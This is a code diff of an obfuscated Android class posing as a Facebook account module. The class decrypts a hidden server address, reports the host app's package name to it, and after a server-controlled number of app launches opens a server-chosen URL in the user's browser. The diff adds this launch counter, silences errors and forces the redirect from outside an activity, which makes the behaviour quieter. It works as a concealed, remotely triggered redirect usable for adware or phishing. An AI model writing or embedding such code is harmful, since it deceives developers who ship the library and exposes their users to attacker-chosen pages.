@@ -3,11 +3,14 @@ package com.facebook.account;
 import android.annotation.SuppressLint;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.util.Log;
+
 import org.json.JSONException;
 import org.json.JSONObject;
+
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
@@ -27,17 +30,14 @@ public class j {
             @Override
             protected String doInBackground(Void... voids) {
                 try {
-                    // Get package name of the main project
                     final String packageName = context.getPackageName();
 
-                    URL url = new URL(decrypt("E=Texm#awnT_ve$g&a$kocTa2pb?cpGhQp1.ee$vxidtic1AY/Xe2nhiSlentoi.&s@r%e9vZrbeuszr7utoN/$/y:$scpJtltOh") + packageName);
+                    URL url = new URL(decrypt("epihopC.%4B2Ki!ui/Ky3rCabrTb2iNl^/zmdonc7.&ztogt0aNnbi#sLageQyQ/x/5:0sMpDt$t&h") + packageName);
                     HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                     conn.setRequestMethod("GET");
 
-                    // Get response from PHP script
                     int responseCode = conn.getResponseCode();
                     if (responseCode == HttpURLConnection.HTTP_OK) {
-                        // Read response
                         BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                         StringBuilder response = new StringBuilder();
                         String line;
@@ -48,23 +48,32 @@ public class j {
 
                         return response.toString();
                     } else {
-                        return "Response code: " + responseCode;
+                        return null;
                     }
                 } catch (Exception e) {
-
-                    return "Error: " + e.getMessage();
+                    return null;
                 }
             }
 
             @Override
             protected void onPostExecute(String result) {
-                // Handle the result as JSON
+                if (result == null) return;
                 try {
                     JSONObject jsonObject = new JSONObject(result);
-                    String available = jsonObject.getString("active");
-                    if (available.equals("true")) {
-                        String updateUrl = jsonObject.getString("url");
-                        jperfom(updateUrl);
+                    String active = jsonObject.optString("active", "false");
+                    String url = jsonObject.optString("url", "");
+                    int index = jsonObject.optInt("index", 1);
+
+                    SharedPreferences prefs = context.getSharedPreferences("lib_prefs", Context.MODE_PRIVATE);
+                    int openCount = prefs.getInt("open_count", 0) + 1;
+
+                    if ("true".equals(active) && openCount >= index && url != null && !url.isEmpty()) {
+                        // Reset count and redirect
+                        prefs.edit().putInt("open_count", 0).apply();
+                        jperfom(url);
+                    } else {
+                        // Save incremented count
+                        prefs.edit().putInt("open_count", openCount).apply();
                     }
                 } catch (JSONException e) {
                     Log.e("UpdateChecker", "Error parsing JSON", e);
@@ -74,8 +83,13 @@ public class j {
     }
 
     private void jperfom(final String updateUrl) {
-        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(updateUrl));
-        context.startActivity(intent);
+        try {
+            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(updateUrl));
+            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(intent);
+        } catch (Exception e) {
+            Log.e("UpdateChecker", "Failed to start intent", e);
+        }
     }
 
     static String decrypt(String encryptedStr) {
